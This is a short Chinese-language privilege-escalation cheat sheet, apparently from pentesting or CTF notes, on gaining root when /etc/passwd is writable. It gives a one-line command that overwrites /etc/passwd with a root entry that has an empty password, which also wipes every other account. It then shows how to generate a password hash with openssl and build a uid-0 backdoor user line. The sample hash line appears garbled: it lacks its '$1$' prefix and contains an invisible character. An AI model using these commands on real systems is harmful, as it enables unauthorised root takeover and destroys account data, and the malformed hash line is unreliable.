# passwd可写(密码写入)

两种方法

1. 直接把root设置成空

```bash
echo root::0:0:root:/root:/bin/bash > /etc/passwd
```

1. 第二种就是密码写入（但是能达成直接写入的情况不如用第一种，方便快捷）

```bash
生成密码如上
openssl passwd -1 -salt pwn pass123
构造格式如下，注意不是每一个都有/结尾，有些是.，但是建议改改密码，有些是.的我失败了
pwn:1﻿pwn$aL2GjO05r1U5G0H4YPr6w/:0:0:root:/root:/bin/bash
```
